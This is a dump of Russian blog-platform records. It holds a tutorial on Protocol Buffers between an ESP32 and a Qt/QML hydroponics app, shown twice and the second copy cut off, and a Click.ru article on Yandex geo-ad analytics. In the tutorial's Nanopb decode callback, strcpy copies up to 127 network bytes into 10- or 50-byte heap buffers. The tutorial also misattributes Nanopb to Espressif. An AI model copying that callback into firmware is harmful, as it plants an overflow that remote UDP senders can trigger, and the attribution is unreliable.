возвращаемого значения позже     Q_INVOKABLE float getTemperature();     Q_INVOKABLE int getWaterLevel();     Q_INVOKABLE bool getValveState();     Q_INVOKABLE bool getPumpState();     Q_INVOKABLE bool getLedState();     Q_INVOKABLE void sendCommand(ProtobufManager::HydroponicCMD command);   signals:     void messageReceived();  public slots:     void packageReceived();  private:     UdpHandler *udpHandler = nullptr;      //Объявление классов protobuf-сообщений     Hydroponic hydroponicMessage;    // Сообщение верхнего уровня     DataPackage dataMessage;     HeartBeat heartBeatMessage;     MessageOk messageOk;     MessageError messageError;     MessageTimeout messageTimeout;      HydroponicMessageType messageType;      bool parseProtobuf(const QByteArray arr);      /*      * Мы не можем получить доступ к enum, определенному в классе Hydroponic, из QML.      * Поэтому я хочу выполнить преобразование enum через look-up таблицу.      * */     QMap<HydroponicCMD,hydroponic::CMD> cmdLookUpTable = {         {HydroponicCMD::CMD_VALVE_ON, hydroponic::CMD::CMD_VALVE_ON},         {HydroponicCMD::CMD_VALVE_OFF, hydroponic::CMD::CMD_VALVE_OFF},         {HydroponicCMD::CMD_PUMP_ON, hydroponic::CMD::CMD_PUMP_ON},         {HydroponicCMD::CMD_PUMP_OFF, hydroponic::CMD::CMD_PUMP_OFF},         {HydroponicCMD::CMD_LED_ON, hydroponic::CMD::CMD_LED_ON},         {HydroponicCMD::CMD_LED_OFF, hydroponic::CMD::CMD_LED_OFF}     }; };  #endif // PROTOBUFMANAGER_HЯ написал класс с именем ProtobufManager, который станет нашим главным инструментом для работы с Protocol Buffers. Этот класс будет отвечать за кодирование и декодирование сообщений на строне бэкенда, а также за отправку их в ESP32, когда это необходимо. Кроме того, мы сможем использовать этот класс и на стороне QML, добавив следующую строку в файл main.cpp:qmlRegisterType<ProtobufManager>(""com.protobuf"", 1, 0, ""ProtobufManager"");Теперь давайте рассмотрим, как мы можем применить сгенерированные protobuf‑классы в нашей программе. Прежде всего, мы определим класс сообщения верхнего уровня:hydroponic::Hydroponic hydroponicMessage;После этого мы определим еще один класс для вложенного сообщения:hydroponic::Command cmdMessage;Далее, зададим поля вложенного сообщения и сообщения верхнего уровня, если они существуют:cmdMessage.set_command(hydroponic::CMD::CMD_VALVE_ON);Для сообщения верхнего уровня мы установим, с каким вложенным сообщением оно связано:hydroponicMessage.set_allocated_cmd(&cmdMessage);После этого сообщение можно сериализовать:QByteArray arr; arr.resize(hydroponicMessage.ByteSizeLong()); // сериализация в массив hydroponicMessage.SerializeToArray(arr.data(), arr.size());Теперь мы готовы отправить сериализованное сообщение, используя любой доступный протокол связи. В нашем примере, поскольку на стороне ESP32 мы использовали протокол UDP, сериализованное hydroponicMessage, содержащее cmdMessage, также будет отправлено по протоколу UDP.this->udpHandler->sendBytes(arr, this->udpHandler->getSenderAddress(), this->udpHandler->getSenderPort()); Чтобы декодировать сообщение, полученное от ESP32, нужно выполнить следующие действия.Мы можем использовать следующую функцию‑парсер после того, как закодированные данные были успешно получены по UDP.... auto result = this->hydroponicMessage.ParseFromArray(arr.data(), arr.size());  if(!result){     qInfo() << ""Protobuf Parse Error"";     return false; }  switch (this->hydroponicMessage.messagetype()) { // или мы можем использовать метод hydroponicMessage.has_datapackage().     case MessageType::MSG_DATA:          qInfo() << ""data packet received"";          this->dataMessage = this->hydroponicMessage.datapackage();          this->messageType = HydroponicMessageType::DATA;          break; ... }Мы также можем использовать метод has класса Hydroponic, чтобы определить, какое сообщение было получено.hydroponicMessage.has_datapackage()Наконец, мы можем получить данные вложенного сообщения с помощью метода get. Вот и все. Работать с Protocol Buffers в C++, как видите, довольно просто. И вы можете использовать полученные данные в любом месте вашего Qt‑приложения.Отображение данных в QMLДавайте отобразим данные, декодированные из protobuf‑сообщения, в пользовательском интерфейсе, созданном с помощью QML. Мы можем использовать класс ProtobufManager в QML с тем же именем, что и компонент QML, поскольку мы объявили его с тем же именем ранее, используя qmlRegisterType.ProtobufManager{     id: protobufManager      property  int xVal: 0     onMessageReceived: {    // Срабатывает при получении сообщения.         // Проверяем тип сообщения          switch(protobufManager.getMessageType()){         case ProtobufManager.DATA:             // Получаем данные             sectorText.txt = protobufManager.getSectorName()             deviceIdText.txt = protobufManager.getDeviceId()             waterLevel.level = protobufManager.getWaterLevel()             temperature.temperatureVal = protobufManager.getTemperature()             ph.phVal = protobufManager.getPh()             humidity.humidityVal = protobufManager.getMoisture()             //eConductivity.eConductivityVal = protobufManager.getECval()             eConductivity.appendData(xVal++,protobufManager.getECval())             waterPumpOfTank.pumpState = protobufManager.getPumpState()             valveOfTank.valveState = protobufManager.getValveState()             ledButton.buttonState = protobufManager.getLedState()             break;          case ProtobufManager.HEART_BEAT:              // Делаем что-то             break;          case ProtobufManager.MESSAGE_OK:              // Делаем что-то             break;          case ProtobufManager.MESSAGE_ERROR:              // Делаем что-то             break;          case ProtobufManager.MESSAGE_TIMEOUT:              // Делаем что-то             break;          default:             console.log(""Invalid Message Type."")             break;         }     } }Мы можем воспользоваться механизмом сигналов и слотов на стороне C++, чтобы понять, было ли получено сообщение.// protobuf_manager.h ... signals:      void messageReceived(); ...Protobuf‑сообщение можно отправлять в различных условиях, которые нам необходимы.PumpIndicator{     id: waterPumpOfTank     width: 300     height: 300     anchors.top: eConductivity.top     anchors.left: eConductivity.right     anchors.leftMargin: 50      pumpState: true     pumpText: ""Tank Water Pump""      onPumpClicked: {         if(pumpState)             protobufManager.sendCommand(ProtobufManager.CMD_PUMP_ON)         else             protobufManager.sendCommand(ProtobufManager.CMD_PUMP_OFF)     }  }Я разработал временный пользовательский интерфейс для мониторинга данных, получаемых от ESP32. Он выглядит довольно просто, но я все еще работаю над ним🙂Примечание: Все изображения и иконки, используемые в этом пользовательском интерфейсе, были взяты с сайтов freepik.com и flaticon.com.Пользовательский интерфейс для гидропонной системыHydroponic UIЗаключениеКак мы увидели, Protocol Buffers предлагает более компактный формат для обмена данными по сравнению с JSON и XML. Его преимущество заключается в более высокой скорости передачи данных благодаря уменьшенному размеру. Protocol Buffers могут быть использован с различными протоколами связи, такими как UART, SPI и I2C, между двумя встроенными системными устройствами, где требуется создание пользовательских пакетов, а не только для связи между серверами или клиентами. Это позволяет сэкономить время на разработке структуры пакета, его создании, синтаксическом анализе и других аспектах, связанных с обменом данными между двумя устройствами. Но, конечно, всегда стоит учитывать время, необходимое для интеграции Protocol Buffers во встроенные системы.В рамках этой статьи невозможно продемонстрировать весь код, поэтому я постарался разобрать как можно больше примеров, связанных с Protocol Buffers. Если вы хотите увидеть полный код для ESP32 и Qt/QML, вы можете посетить мою страницу на Github.В завершение нашего погружения в мир Protocol Buffers и эффективной передачи данных между ESP32 и Qt/QML, я рад пригласить вас на открытый урок по теме «Путешествие в мир Авроры. Искусство создания приложений с Qt/QML», где мы получим практический опыт создания простого приложения на QML, взаимодействующего с графической подсистемой. Урок пройдет 22 апреля, записывайтесь по ссыке.Открытые уроки в Otus проходят каждый день — переходите в календарь мероприятий и выбирайте интересующие темы.  "
69,Как методы расширенной аналитики помогают оценить эффективность георекламы в Яндексе,Click.ru,Рекламная экосистема,0,"Реклама и маркетинг, Поисковые технологии, Веб-сервисы",2025-04-09,"Геореклама помогает привлекать клиентов, которые находятся рядом с вами. С ее помощью можно рассказать пользователям об акциях, скидках или просто напомнить о бренде. Этот формат рекламы пока используют нечасто, хотя он эффективен и доступен любому бизнесу. Рассказываем, как его применять и правильно измерять результаты, а также чем могут помочь инструменты аналитики click.ru.Главные показатели для оценки эффективности георекламыДля оценки эффективности георекламы в сервисах Яндекса используют разные инструменты аналитики — как базовые, так и расширенные. Разберем их подробно.В БизнесеЭффективность георекламы можно оценить в личном кабинете раздела «Статистика».Статистика в БизнесеЗдесь отображаются просмотры, количество кликов (переходов) и действия целевых клиентов в карточке. При подключении услуги коллтрекинга также доступна детальная аналитика звонков: принятые и пропущенные вызовы, время ожидания и продолжительность разговора.В ДиректеВ Директе наиболее прозрачная и подробная статистика по рекламе в геосервисах. Если подключены кампании в Картах, можно просто анализировать стандартный Мастер отчетов.Статистика в ДиректеВ нем можно выбрать срезы «Название площадки» и «Вид размещения» и задать фильтр по типу размещения «Карты». Другие столбцы и срезы — на ваше усмотрение. Кроме базовых метрик (показов, кликов) доступна более глубокая аналитика: процент отказов, конверсии, география, устройства, а также демографические характеристики аудитории.В ГеорекламеОтчет доступен в личном кабинете во вкладке «Статистика». Статистика в ГеорекламеЗдесь можно увидеть следующие показатели:число показов объявления (учитываются просмотры длительностью не менее 2 секунд);количество кликов по баннеру;CTR — соотношение кликов к показам;количество перестроенных маршрутов в сторону рекламируемой точки;число звонков и переходов на сайт;затраты на рекламную кампанию.Методы расширенной аналитикиГлавные задачи медийной рекламы — охватить аудиторию и познакомить ее с продуктом. Для оценки эффективности кампаний важно понимать, как реклама помогла достичь именно эти цели. Рассмотрим инструменты, которые предоставляют возможность выявить этот «отложенный» эффект. Есть пять исследований, позволяющих получить детальную аналитику. Их подключение можно заказать через персонального менеджера.Brand LiftЕсли вы раньше запускали стандартную медийную рекламу в Директе, то уже познакомились с этим исследованием. Оно позволяет оценить, как изменилось восприятие бренда после контакта с рекламой. Исследование проводится по завершении размещения в Навигаторе или Картах и доступно для кампаний, ориентированных на Москву и Санкт-Петербург.Brand Lift для пользователейBrand Lift — это опрос. Пользователи отвечают на вопросы, касающиеся, кроме прочего, и вашего бренда. На основе полученных данных можно определить, сколько людей выбрали ваш бренд после того, как увидели геомедийную рекламу и насколько увеличилась его узнаваемость.Часть результатов опроса Brand LiftSearch LiftЭто исследование, знакомое по медийной рекламе в Директе, позволяет оценить, как просмотр рекламы влияет на частоту брендовых запросов в Картах и Навигаторе. Также помогает определить, какие именно запросы вводили пользователи. Подходит для следующих форматов:пины в Геосервисах;билборды и премиум-билборды в Геосервисах;баннеры и премиум-баннеры в Геосервисах.Рекомендованный бюджет — от 300 000 рублей в месяц.Часть результатов отчета по исследованию Search LiftAction LiftПозволяет оценить, изменилось ли поведение пользователей в геосервисах после контакта с георекламой — начали ли они чаще открывать карточку организации, прокладывать маршруты и доезжать до точки.Обязательные условия для проведения исследования:подключенная Метрика для медийной рекламы;наличие офлайн-точек у компании.Важно: исследование фиксирует намерения пользователей посетить филиал, а не фактические конверсии.Часть результатов исследования Action LiftOffline Visit LiftЭто исследование доступно для рекламы в формате «Пины в Геосервисах». Оно позволяет понять, как часто пользователи нажимали кнопку «Заехать» на баннере и выросло ли количество визитов в офлайн-точки после просмотра рекламы.Особенности:для анализа выбираются отдельно стоящие точки продаж, чтобы исключить влияние соседних заведений;исследование подходит для автоцентров, ресторанов быстрого обслуживания и других локаций с четкой геопривязкой.Необходимые условия:наличие офлайн-точек;бюджет кампании от 500 000 руб. в месяц.Схема исследования Offline Visit LiftO2O (online-to-offline)Продажи — ключевая метрика эффективности, но отследить влияние онлайн-рекламы на офлайн-покупки непросто. Исследование O2O помогает решить эту задачу с помощью алгоритмов на основе технологии Крипта, которые сопоставляют данные о показах рекламы и фактических покупках.Как это работает:алгоритм анализирует поведенческий профиль пользователей (интересы, запросы, демографию) в обезличенном формате;определяет, кто видел рекламу в геосервисах;сравнивает эти данные со списком покупателей, переданным рекламодателем, чтобы выявить пользователей, которые сделали покупку после контакта с рекламой.Схема исследования O2OОтчет формируется на основе данных о покупках, которые рекламодатель передает персональному менеджеру. Файл загружается в Аудитории по аналогии с CRM-сегментами.Post-campaignТакой отчет можно запросить у персонального менеджера. В нем собирается вся аналитика в одном документе, включая статистику кампании из кабинета геомедийной рекламы, сгруппированную по нужным параметрам. Отчет оформляется в виде презентации с наглядными графиками, демонстрирующими влияние рекламы на продажи. В нем учитываются post-view-данные из поиска, показатели из Метрики и данные о доходимости аудитории.Советы по улучшению георекламы с помощью аналитикиЯндекс предлагает множество инструментов для оценки эффективности георекламы. Главное — правильно интерпретировать данные и вносить нужные корректировки.В БизнесеСтатистика здесь ограничена, но позволяет оценить конверсионность продвижения и качество входящих звонков. Если заявок мало, стоит проверить:информативность карточки организации — добавлены ли все филиалы, качественные ли фото и описание;идет ли работа с отзывами;как оперативно сотрудники отвечают на звонки. Если много непринятых, возможно, стоит улучшить клиентский сервис.В ДиректеОсновной инструмент анализа — Мастер отчетов. Здесь больше возможностей для оптимизации:корректировки ставок помогут отсеять нерелевантную аудиторию;эксперименты со стратегиями и бюджетом позволят найти оптимальную модель размещения.Однако в Картах геонастройки из рекламной кампании не работают, а заголовки и тексты не отображаются. Поэтому ключевой фактор успеха — качественное оформление карточки организации.В геомедийной рекламеПри оптимизации используем расширенную аналитику.Search Lift — анализ популярных запросов, которые можно добавить в контекстную рекламу.Brand Lift — сравнение узнаваемости бренда с конкурентами. Если отстаете, стоит изучить их рекламу и продукт.Action Lift — помогает понять, на каком этапе пользователи «отваливаются». Например, если после клика на карточку они не строят маршрут, возможно, стоит пересмотреть контент или добавить больше кнопок действий.Offline Visit Lift — показывает, почему пользователи не перестраивают маршрут в пользу вашей точки. Если аудитория выбрана неправильно, стоит пересмотреть таргетинг.O2O — помогает оценить «доходимость» пользователей. Если точка расположена в проходимом месте, например в ТЦ, не все визиты будут целевыми.Правильный анализ данных позволит скорректировать кампанию и повысить ее эффективность.ЗаключениеГеореклама помогает повысить узнаваемость бренда, но не стоит ожидать от нее мгновенного эффекта. Она работает на долгосрочную перспективу, формируя образ компании. Результаты проявляются постепенно.Формат требует серьезных вложений, поэтому важно отслеживать его эффективность с помощью расширенной аналитики. Если бюджет ограничен, лучше стартовать с Директа или Бизнеса — они менее затратны и дают более прозрачные показатели. Чтобы анализировать динамику рекламы в разных системах и оценивать ситуацию в нише, можно бесплатно использовать инструмент «Пульс click.ru». Он помогает следить за ключевыми метриками, изучать рынок, сравнивать конкурентов и грамотно распределять бюджет."
70,Эффективная передача данных: используем Protocol Buffers для коммуникации между ESP32 и QT/QML,OTUS,Цифровые навыки от ведущих экспертов,0,"Консалтинг и поддержка, Рекрутинг и HR, Производство мультимедиа-контента",2025-04-09,"В этой статье я хочу рассказать вам о том, как можно эффективно использовать Protocol Buffers в сочетании с ESP32 и Qt Framework. Для наглядности я сделаю это на примере собственного хобби‑проекта, который представляет из себя гидропонную систему. В этом проекте мы попытаемся наладить коммуникацию между ESP32 и приложением Qt/QML, используя Protocol Buffers через UDP.ESP32 выступает в роли встроенной системы гидропонной установки, а Qt/QML отвечает за мониторинг данных и управление. Но прежде чем мы приступим к реализации, давайте разберемся, что такое Protocol Buffers.Что такое Protobuf?Protocol Buffers, или Protobuf — это уникальный протокол сериализации данных, разработанный компанией Google. В отличие от традиционных текстовых форматов, таких как XML или JSON, Protobuf использует двоичный код для передачи данных, что обеспечивает высокую скорость за (счет легкости данных). Одна из ключевых особенностей Protobuf заключается в том, что он, подобно языку программирования, имеет свой собственный синтаксис и компилятор. Это позволяет легко передавать данные между различными платформами и делает его независимым от языков программирования. Protobuf поддерживает множество языков, включая C++, Java, Python, GO и многие другие. Мы можем использовать Protobuf в любом приложении, где нам требуется собственный метод коммуникации или структура пакетов. Однако наиболее часто он применяется в gRPC в качестве языка описания интерфейса. Сообщения Protobuf хранятся в файле с расширением .proto (например, person.proto) и описываются следующим образом:syntax = ""proto3""  message Person {   optional string name = 1;   optional int32 id = 2;   optional string email = 3; }Как мы уже упоминали выше, у Protobuf есть свой собственный компилятор, который позволяет нам создавать сообщения protobuf для любого языка, как показано ниже.protoc --cpp_out=. person.protoВ результате сборки генерируются библиотечные файлы. Для приведенного выше proto‑файла они будут называться person_pb.cc и person_pb.h.В этом примере я хочу изменить структуру сообщений, чтобы они стали более реалистичными, а также добавить вложенные сообщения. Proto‑файл под названием hydroponic_data.proto, который я буду использовать в этом примере, выглядит следующим образом:syntax = ""proto3"";  package hydroponic;  enum MessageType {     MSG_HEART_BEAT = 0;     MSG_OK = 1;     MSG_ERROR = 2;     MSG_DATA = 3;     MSG_TIMEOUT = 4;  MSG_CMD = 5; }  enum CMD {  CMD_VALVE_ON = 0;  CMD_VALVE_OFF = 1;  CMD_PUMP_ON = 2;  CMD_PUMP_OFF = 3;  CMD_LED_ON = 4;  CMD_LED_OFF = 5; }  message Hydroponic {  MessageType messageType = 1;   oneof msg {   DataPackage dataPackage = 2;   HeartBeat heartBeat = 3;   MessageOk messageOk = 4;   MessageError messageError = 5;   MessageTimeout messageTimeout = 6;   Command cmd = 7;  }  }  message DataPackage {     uint32 deviceID = 2;     string sector = 3;     float eConductivity = 4;     float ph = 5;     float moisture = 6;     float temperature = 7;     uint32 waterLevel = 8;     bool valveState = 9;     bool pumpState = 10;     bool ledStatus = 11; }  message HeartBeat {  uint32 elapsedTime = 1; }  message MessageOk {  string responseMessage = 1; }  message MessageError {  string errorType = 1; }  message MessageTimeout {  string timeoutMessage = 1; }  message Command {  CMD command = 1; }Еще один важный аспект, о котором стоит упомянуть, — это вложенные сообщения. Как вы могли заметить, выше было описано несколько сообщений, которые находились внутри других. В языке Protobuf такое расположение одного сообщения внутри другого называется вложенным. Ключевое слово oneof позволяет нам ограничить количество вложенных сообщений в одном сообщении. То есть, мы можем отправлять только одно из вложенных сообщений за раз.Что такое Nanopb?Для работы с Protocol Buffers на ESP32 мы будем использовать библиотеку Nanopb. Nanopb — это легковесная и эффективная библиотека на языке C для кодирования и декодирования Protobuf‑сообщений. Nanopb, разработанная компанией Espressif Systems, оптимизирована специально для микроконтроллеров. У нее есть собственный protobuf‑компилятор под названием protoc, который также генерирует библиотеки на языке C после сборки. Для использования вложенных сообщений с Nanopb нам нужно добавить следующие строки в наш proto‑файл.import 'nanopb.proto'; ... option (nanopb_msgopt).submsg_callback = true;После этого proto‑файл будет выглядеть следующим образом:syntax = ""proto3"";  import 'nanopb.proto';  package hydroponic;  enum MessageType {     MSG_HEART_BEAT = 0;     MSG_OK = 1;     MSG_ERROR = 2;     MSG_DATA = 3;     MSG_TIMEOUT = 4;     MSG_CMD = 5; }  enum CMD {  CMD_VALVE_ON = 0;  CMD_VALVE_OFF = 1;  CMD_PUMP_ON = 2;  CMD_PUMP_OFF = 3;  CMD_LED_ON = 4;  CMD_LED_OFF = 5; }  message Hydroponic {  MessageType messageType = 1;   option (nanopb_msgopt).submsg_callback = true;   oneof msg {   DataPackage dataPackage = 2;   HeartBeat heartBeat = 3;   MessageOk messageOk = 4;   MessageError messageError = 5;   MessageTimeout messageTimeout = 6;   Command cmd = 7;  }  }  message DataPackage {     uint32 deviceID = 2;     string sector = 3;     float eConductivity = 4;     float ph = 5;     float moisture = 6;     float temperature = 7;     uint32 waterLevel = 8;     bool valveState = 9;     bool pumpState = 10;     bool ledStatus = 11; }  message HeartBeat {  uint32 elapsedTime = 1; }  message MessageOk {  string responseMessage = 1; }  message MessageError {  string errorType = 1; }  message MessageTimeout {  string timeoutMessage = 1; }  message Command {  CMD command = 1; }Чтобы скомпилировать proto‑файл в соответствии с требованиями Nanopb, нам нужно использовать protoc, который находится в каталоге, откуда мы загрузили Nanopb.pathto\generator-bin\protoc.exe --nanopb_out=. hydroponic_data.protoКроме того, для использования Protocol Buffers с ESP32, нам нужно добавить в проект библиотеки Nanopb, которые находятся в каталоге, куда мы скачали Nanopb.Также нам необходимо реализовать коллбеки для кодирования и декодирования строк и вложенных сообщений на стороне Nanopb. Я реализовал эти функции в файлах protobuf_callbacks.h и protobuf_callbacks.c.bool write_string(pb_ostream_t *stream, const pb_field_iter_t *field, void * const *arg) {     if (!pb_encode_tag_for_field(stream, field))         return false;      return pb_encode_string(stream, (uint8_t*)*arg, strlen((char*)*arg)); }  bool read_string(pb_istream_t *stream, const pb_field_t *field, void **arg) {     uint8_t buffer[128] = {0};          /* Мы можем читать блок за блоком, чтобы избежать большого размера буфера... */     if (stream->bytes_left > sizeof(buffer) - 1)         return false;     if (!pb_read(stream, buffer, stream->bytes_left))         return false;     /* Выводим строку в формате, сравнимом с protoc --decode.      * Формат берется из arg, определенного в main().      */     //printf((char*)*arg, buffer);      strcpy((char*)*arg, (char*)buffer);     return true; }  bool msg_callback(pb_istream_t *stream, const pb_field_t *field, void **arg) {      // hydroponic_Hydroponic *topmsg = field->message;     // ESP_LOGI(TAG,""Message Type: %d"" , (int)topmsg->messageType);      if (field->tag == hydroponic_Hydroponic_dataPackage_tag)     {         hydroponic_DataPackage *message = field->pData;          message->sector.funcs.decode =& read_string;         message->sector.arg = malloc(10*sizeof(char));      }      else if (field->tag == hydroponic_Hydroponic_messageOk_tag)     {         hydroponic_MessageOk *message = field->pData;          message->responseMessage.funcs.decode =& read_string;         message->responseMessage.arg = malloc(50*sizeof(char));             }      else if (field->tag == hydroponic_Hydroponic_messageError_tag)     {         hydroponic_MessageError *message = field->pData;          message->errorType.funcs.decode =& read_string;         message->errorType.arg = malloc(50*sizeof(char));      }      else if (field->tag == hydroponic_Hydroponic_messageTimeout_tag)     {         hydroponic_MessageTimeout *message = field->pData;          message->timeoutMessage.funcs.decode =& read_string;         message->timeoutMessage.arg = malloc(50*sizeof(char));            }      return true; }После этого мы готовы использовать Protocol Buffers с ESP32.... hydroponic_Hydroponic messageToSend = hydroponic_Hydroponic_init_zero;  messageToSend.messageType = hydroponic_MessageType_MSG_DATA;  messageToSend.which_msg = hydroponic_Hydroponic_dataPackage_tag;  // Решаем, какое сообщение будет отправлено.   messageToSend.msg.dataPackage.deviceID = 10;  messageToSend.msg.dataPackage.sector.arg = ""Sector-1"";  messageToSend.msg.dataPackage.sector.funcs.encode =& write_string; messageToSend.msg.dataPackage.temperature = 10.0f; ...Таким образом мы можем создавать сообщения. После создания сообщения и назначения данных определенным полям, мы можем сериализовать сообщение с помощью функции кодирования следующим образом:uint8_t buffer[128] = {0}; ... pb_ostream_t ostream = pb_ostream_from_buffer(buffer, sizeof(buffer));  pb_encode(&ostream, hydroponic_Hydroponic_fields, &messageToSend); ...Затем мы можем отправить buffer, представляющий сериализованное сообщение, используя любой предпочитаемый нами протокол связи:sendto(socket, buffer, ostream.bytes_written, 0, (struct sockaddr *)&dest_addr, sizeof(dest_addr));Если кто‑то отправит protobuf‑сообщение на ESP32, мы получим его в виде массивов байтов. Для десериализации сообщения мы можем воспользоваться коллбеком декодирования:hydroponic_Hydroponic receivedMessage = hydroponic_Hydroponic_init_zero; ... pb_istream_t istream = pb_istream_from_buffer(buffer, len); receivedMessage.cb_msg.funcs.decode = &msg_callback;   bool ret = pb_decode(&istream, hydroponic_Hydroponic_fields, receivedMessage); ... if(receivedMessage.which_msg == hydroponic_Hydroponic_dataPackage_tag){          ESP_LOGI(TAG, ""Data Package Received."");       ESP_LOGI(TAG, ""Device ID: %ld"", receivedMessage.msg.dataPackage.deviceID);     ... } else if(receivedMessage.which_msg == hydroponic_Hydroponic_heartBeat_tag){     ESP_LOGI(TAG, ""Heartbeat Package Received."");     ESP_LOGI(TAG, ""Elapsed time %ld."", receivedMessage.msg.heartBeat.elapsedTime); } ... ...Поддержка на стороне QTЧтобы использовать Protocol Buffers в нашем Qt‑проекте, нам необходимо сначала скомпилировать их под C++. Вы можете ознакомиться с документацией по сборке Protocol Buffers для C++ на странице проекта Protobuf на GitHub. Qt также добавила поддержку Protocol Buffers с версии 6.6.1. В этой версии появилась возможность создавать классы protobuf на основе Qt, но я пока не пробовал этот метод. Вместо этого я покажу вам, как добавить статическую библиотеку protobuf в ваш Qt‑проект.GitHub - protocolbuffers/protobuf: Protocol Buffers — формат обмена данными от GoogleДля начала нам необходимо добавить в наш Qt‑проект статическую библиотеку (lib‑файл) и заголовочные файлы, которые были созданы при сборке из исходного кода. Чтобы сделать это, добавьте следующие строки в .pro‑файл Qt‑проекта:LIBS += -L$$PWD/protobuf/ -llibprotobufd  INCLUDEPATH += $$PWD/protobuf INCLUDEPATH += $$PWD/protobuf/include DEPENDPATH += $$PWD/protobufТакже необходимо добавить следующую строку для активации режима отладки библиотеки во время выполнения:QMAKE_CXXFLAGS_DEBUG += /MTdТеперь мы готовы создать файл hydroponic_data.proto для C++. В этом proto‑файле я удалил строки, касающиеся Nanopb, поскольку мы будем использовать собранный нами компилятор protobuf, скачанный с Github. Если этого не сделать, то компилятор будет выдавать ошибки на строках, связанных с Nanopb.pathto\protobuf\install\bin\protoc.exe --cpp_out=. hydroponic_data.protoПосле того как сгенерированная нами библиотека protobuf‑сообщений будет добавлена, мы сможем использовать Protocol Buffers в нашем Qt‑проекте.#ifndef PROTOBUFMANAGER_H #define PROTOBUFMANAGER_H  #include <QObject> #include <QMap> #include ""hydroponic_data.pb.h"" #include ""udphandler.h""  using namespace hydroponic;  class ProtobufManager : public QObject {     Q_OBJECT public:     explicit ProtobufManager(QObject *parent = nullptr);     ~ProtobufManager();      enum HydroponicMessageType{         DATA = 0,         HEART_BEAT,         MESSAGE_OK,         MESSAGE_ERROR,         MESSAGE_TIMEOUT     };     Q_ENUM(HydroponicMessageType)      enum HydroponicCMD{         CMD_VALVE_ON = 0,         CMD_VALVE_OFF = 1,         CMD_PUMP_ON = 2,         CMD_PUMP_OFF = 3,         CMD_LED_ON = 4,         CMD_LED_OFF = 5,     };      Q_ENUM(HydroponicCMD)      Q_INVOKABLE ProtobufManager::HydroponicMessageType getMessageType();     Q_INVOKABLE int getDeviceId();     Q_INVOKABLE QString getSectorName();     Q_INVOKABLE float getECval();     Q_INVOKABLE float getPh();     Q_INVOKABLE float getMoisture(); // изменим тип возвращаемого значения позже     Q_INVOKABLE float getTemperature();     Q_INVOKABLE int getWaterLevel();     Q_INVOKABLE bool getValveState();     Q_INVOKABLE bool getPumpState();     Q_INVOKABLE bool getLedState();     Q_INVOKABLE void sendCommand(ProtobufManager::HydroponicCMD command);   signals:     void messageReceived();  public slots:     void packageReceived();  private:     UdpHandler *udpHandler = nullptr;      //Объявление классов protobuf-сообщений     Hydroponic hydroponicMessage;    // Сообщение верхнего уровня     DataPackage dataMessage;     HeartBeat heartBeatMessage;     MessageOk messageOk;     MessageError messageError;     MessageTimeout messageTimeout;      HydroponicMessageType messageType;      bool parseProtobuf(const QByteArray arr);      /*      * Мы не можем получить доступ к enum, определенному в классе Hydroponic, из QML.      * Поэтому я хочу выполнить преобразование enum через look-up таблицу.      * */     QMap<HydroponicCMD,hydroponic::CMD> cmdLookUpTable = {         {HydroponicCMD::CMD_VALVE_ON, hydroponic::CMD::CMD_VALVE_ON},         {HydroponicCMD::CMD_VALVE_OFF, hydroponic::CMD::CMD_VALVE_OFF},         {HydroponicCMD::CMD_PUMP_ON, hydroponic::CMD::CMD_PUMP_ON},         {HydroponicCMD::CMD_PUMP_OFF, hydroponic::CMD::CMD_PUMP_OFF},         {HydroponicCMD::CMD_LED_ON, hydroponic::CMD::CMD_LED_ON},         {HydroponicCMD::CMD_LED_OFF, hydroponic::CMD::CMD_LED_OFF}     }; };  #endif // PROTOBUFMANAGER_HЯ написал класс с именем ProtobufManager, который станет нашим главным инструментом для работы с Protocol Buffers. Этот класс будет отвечать за кодирование и декодирование сообщений на строне бэкенда, а также за отправку их в ESP32, когда это необходимо. Кроме того, мы сможем использовать этот класс и на стороне QML, добавив следующую строку в файл main.cpp:qmlRegisterType<ProtobufManager>(""com.protobuf"", 1, 0, ""ProtobufManager"");Теперь давайте рассмотрим, как мы можем применить сгенерированные protobuf‑классы в нашей программе. Прежде всего, мы определим класс сообщения верхнего уровня:hydroponic::Hydroponic hydroponicMessage;После этого мы определим еще один класс для вложенного сообщения:hydroponic::Command cmdMessage;Далее, зададим поля вложенного сообщения и сообщения верхнего уровня, если они существуют:cmdMessage.set_command(hydroponic::CMD::CMD_VALVE_ON);Для сообщения верхнего уровня мы установим, с каким вложенным сообщением оно связано:hydroponicMessage.set_allocated_cmd(&cmdMessage);После этого сообщение можно сериализовать:QByteArray arr; arr.resize(hydroponicMessage.ByteSizeLong()); // сериализация в массив hydroponicMessage.SerializeToArray(arr.data(), arr.size());Теперь мы готовы отправить сериализованное сообщение, используя любой доступный протокол связи. В нашем примере, поскольку на стороне ESP32 мы использовали протокол UDP, сериализованное hydroponicMessage, содержащее cmdMessage, также будет отправлено по протоколу UDP.this->udpHandler->sendBytes(arr, this->udpHandler->getSenderAddress(), this->udpHandler->getSenderPort()); Чтобы декодировать сообщение, полученное от ESP32, нужно выполнить следующие действия.Мы можем использовать следующую функцию‑парсер после того, как закодированные данные были успешно получены по UDP.... auto result = this->hydroponicMessage.ParseFromArray(arr.data(), arr.size());  if(!result){     qInfo() << ""Protobuf Parse Error"";     return false; }  switch (this->hydroponicMessage.messagetype()) { // или мы можем использовать метод hydroponicMessage.has_datapackage().     case MessageType::MSG_DATA:          qInfo() << ""data packet received"";          this->dataMessage = this->hydroponicMessage.datapackage();          this->messageType = HydroponicMessageType::DATA;          break; ... }Мы также можем использовать метод has класса Hydroponic, чтобы определить, какое сообщение было получено.hydroponicMessage.has_datapackage()Наконец, мы можем получить данные вложенного сообщения с помощью метода get. Вот и все. Работать с Protocol Buffers в C++, как видите, довольно просто. И вы можете использовать полученные данные в любом месте вашего Qt‑приложения.Отображение данных в QMLДавайте отобразим данные, декодированные из protobuf‑сообщения, в пользовательском интерфейсе, созданном с помощью QML. Мы можем использовать класс ProtobufManager в QML с тем же именем, что и компонент QML, поскольку мы объявили его с тем же именем ранее, используя qmlRegisterType.ProtobufManager{     id: protobufManager      property  int xVal: 0     onMessageReceived: {    // Срабатывает при получении сообщения.         // Проверяем тип сообщения          switch(protobufManager.getMessageType()){         case ProtobufManager.DATA:             // Получаем данные             sectorText.txt = protobufManager.getSectorName()             deviceIdText.txt = protobufManager.getDeviceId()             waterLevel.level = protobufManager.getWaterLevel()             temperature.temperatureVal = protobufManager.getTemperature()             ph.phVal = protobufManager.getPh()             humidity.humidityVal = protobufManager.getMoisture()             //eConductivity.eConductivityVal = protobufManager.getECval()             eConductivity.appendData(xVal++,protobufManager.getECval())             waterPumpOfTank.pumpState = protobufManager.getPumpState()             valveOfTank.valveState = 